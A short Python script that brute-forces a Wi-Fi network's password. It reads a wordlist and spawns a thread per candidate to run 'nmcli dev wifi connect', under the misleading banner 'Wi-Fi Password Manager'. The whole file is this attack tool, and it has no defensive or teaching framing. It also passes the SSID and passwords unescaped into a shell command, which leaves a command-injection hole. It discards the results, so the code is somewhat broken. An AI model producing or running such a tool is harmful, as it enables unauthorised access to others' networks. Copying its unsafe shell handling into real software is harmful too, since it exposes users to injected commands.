import os
import subprocess
import threading

def connect_to_wifi(ssid, password):
    command = f"nmcli dev wifi connect '{ssid}' password '{password}'"
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    return result.stdout, result.stderr

def attempt_multiple_passwords(ssid, passwords):
    threads = []
    for password in passwords:
        thread = threading.Thread(target=connect_to_wifi, args=(ssid, password))
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()

def read_passwords_from_file(file_path):
    with open(file_path, 'r') as file:
        passwords = file.readlines()
    return [pwd.strip() for pwd in passwords]

def main():
    print("Wi-Fi Password Manager")
    ssid = input("Enter the SSID of the Wi-Fi network: ")
    file_path = input("Enter the path to the password file: ")
    passwords = read_passwords_from_file(file_path)
    
    attempt_multiple_passwords(ssid, passwords)

if __name__ == "__main__":
    main()
